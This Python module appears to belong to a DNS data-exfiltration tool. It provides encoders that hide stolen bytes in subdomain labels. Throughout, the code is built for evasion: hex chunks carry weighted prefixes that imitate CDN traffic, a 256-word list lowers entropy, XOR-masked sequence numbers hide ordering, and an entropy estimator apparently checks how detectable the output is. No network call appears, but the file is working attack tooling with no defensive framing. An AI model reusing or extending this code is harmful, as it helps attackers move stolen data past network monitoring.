"""Encoding strategies for DNS subdomain data exfiltration.

Two strategies available:
- hex_split: Split hex-encoded data across short labels with realistic prefixes
- wordlist: Map each byte to a short English word (lowest entropy)

Sequence numbers are embedded inside the encoded data (first SEQUENCE_BYTES),
XORed with a session key so no sequential pattern is visible.
"""

import math
import os
import struct
from collections import Counter

# Diverse prefixes that mimic real CDN/SaaS URL patterns
# Weighted selection to avoid uniform distribution (some prefixes are more common)
HEX_PREFIXES = [
    ("img", 15), ("css", 12), ("js", 12), ("api", 10),
    ("cdn", 8), ("v1", 5), ("v2", 5), ("s", 8),
    ("t", 6), ("p", 5), ("a", 4), ("b", 4),
    ("f", 3), ("d", 3), ("e", 2), ("x", 2),
    ("u", 1),
]
_PREFIX_NAMES = [p[0] for p in HEX_PREFIXES]
_PREFIX_WEIGHTS = [p[1] for p in HEX_PREFIXES]

# 256 common short words (3-6 chars, lowercase, DNS-safe)
# Each word maps to one byte value (index = byte value)
WORDLIST = [
    "ace", "add", "age", "ago", "aid", "aim", "air", "all", "and", "ant",
    "any", "ape", "app", "arc", "are", "ark", "arm", "art", "ash", "ask",
    "ate", "auto", "avid", "away", "axe", "back", "bad", "bag", "ban", "bar",
    "bat", "bay", "bed", "bee", "belt", "ben", "best", "bet", "bid", "big",
    "bin", "bird", "bit", "blow", "blue", "boat", "body", "bold", "bolt", "bomb",
    "bond", "bone", "book", "boot", "born", "boss", "both", "bow", "box", "boy",
    "bug", "bulk", "bull", "burn", "bus", "busy", "buy", "cab", "cage", "cake",
    "call", "calm", "came", "camp", "can", "cap", "car", "card", "care", "cart",
    "case", "cash", "cast", "cat", "cave", "cell", "chat", "chip", "city", "clam",
    "clay", "clip", "club", "coal", "coat", "code", "coil", "coin", "cold", "colt",
    "come", "cook", "cool", "cope", "copy", "cord", "core", "corn", "cost", "cosy",
    "crew", "crop", "crow", "cube", "cult", "cup", "curl", "cut", "dale", "dam",
    "dame", "dare", "dark", "dash", "data", "date", "dawn", "day", "dead", "deal",
    "dear", "deck", "deed", "deep", "deer", "demo", "deny", "desk", "dial", "did",
    "die", "dig", "dim", "dine", "dirt", "disc", "dish", "dock", "does", "dog",
    "dome", "done", "door", "dose", "dot", "down", "drag", "draw", "drew", "drop",
    "drug", "drum", "dry", "duck", "due", "dug", "duke", "dump", "dune", "dust",
    "duty", "each", "earn", "ease", "east", "easy", "eat", "edge", "edit", "eel",
    "ego", "elm", "else", "emit", "end", "epic", "era", "even", "ever", "evil",
    "exam", "exit", "eye", "face", "fact", "fade", "fail", "fair", "fake", "fall",
    "fame", "fan", "far", "farm", "fast", "fat", "fate", "fawn", "fear", "feat",
    "feed", "feel", "feet", "fell", "felt", "fern", "file", "fill", "film", "find",
    "fine", "fire", "firm", "fish", "fist", "five", "fix", "flag", "flat", "fled",
    "flew", "flip", "flow", "flux", "foam", "foil", "fold", "folk", "fond", "font",
    "food", "fool", "foot", "ford", "fore", "fork", "form", "fort", "foul", "four",
    "free", "frog", "from", "fuel", "full", "fun",
]

WORD_TO_BYTE = {word: idx for idx, word in enumerate(WORDLIST)}


def _pick_prefix(rng):
    """Pick a prefix using weighted random selection."""
    import random
    r = rng if rng else random
    return r.choices(_PREFIX_NAMES, weights=_PREFIX_WEIGHTS, k=1)[0]


def encode_hex_split(data, label_len=8, rng=None):
    """Encode bytes as hex split across short DNS labels with weighted prefixes.

    Each label: <prefix><hex_chars> (e.g., 'img3f2a1b')
    Prefix selection is weighted to mimic natural CDN patterns.
    Returns list of label strings.
    """
    import random
    r = rng if rng else random
    hex_str = data.hex()
    labels = []
    i = 0
    while i < len(hex_str):
        prefix = _pick_prefix(r)
        hex_chars = label_len - len(prefix)
        if hex_chars < 2:
            hex_chars = 2
        chunk = hex_str[i:i + hex_chars]
        labels.append(f"{prefix}{chunk}")
        i += hex_chars
    return labels


def decode_hex_split(labels):
    """Decode hex-split labels back to bytes.

    Strips known prefixes and concatenates remaining hex chars.
    """
    hex_str = ""
    for label in labels:
        # Find where the prefix ends (prefixes are all-alpha, data starts with hex digit)
        for j, ch in enumerate(label):
            if ch in "0123456789abcdef" and (j == 0 or not label[j - 1].isalpha() or j > 0):
                if j > 0 and label[:j].isalpha():
                    hex_str += label[j:]
                    break
                elif j == 0:
                    hex_str += label
                    break
        else:
            pass
    if len(hex_str) % 2 != 0:
        hex_str = hex_str[:-1]
    return bytes.fromhex(hex_str)


def encode_wordlist(data):
    """Encode bytes using word lookup table."""
    return [WORDLIST[b] for b in data]


def decode_wordlist(labels):
    """Decode word labels back to bytes."""
    return bytes([WORD_TO_BYTE[word] for word in labels])


def xor_sequence(seq_num, session_key):
    """XOR a 2-byte sequence number with a 4-byte session key.

    Returns 2 bytes that look like random data.
    """
    seq_bytes = struct.pack(">H", seq_num)
    xored = bytes(a ^ b for a, b in zip(seq_bytes, session_key[:2]))
    return xored


def decode_xor_sequence(xored_bytes, session_key):
    """Reverse the XOR to recover the original sequence number."""
    seq_bytes = bytes(a ^ b for a, b in zip(xored_bytes, session_key[:2]))
    return struct.unpack(">H", seq_bytes)[0]


def embed_sequence(data_chunk, seq_num, session_key):
    """Prepend XOR-obfuscated sequence number to data chunk.

    The sequence is hidden within the data — no separate label needed.
    """
    xored_seq = xor_sequence(seq_num, session_key)
    return xored_seq + data_chunk


def extract_sequence(encoded_chunk, session_key):
    """Extract and decode the sequence number from an encoded chunk.

    Returns (seq_num, data_chunk).
    """
    xored_seq = encoded_chunk[:2]
    data = encoded_chunk[2:]
    seq_num = decode_xor_sequence(xored_seq, session_key)
    return seq_num, data


def estimate_entropy(text):
    """Estimate Shannon entropy of a string in bits per character."""
    if not text:
        return 0.0
    counts = Counter(text)
    length = len(text)
    entropy = 0.0
    for count in counts.values():
        p = count / length
        if p > 0:
            entropy -= p * math.log2(p)
    return entropy
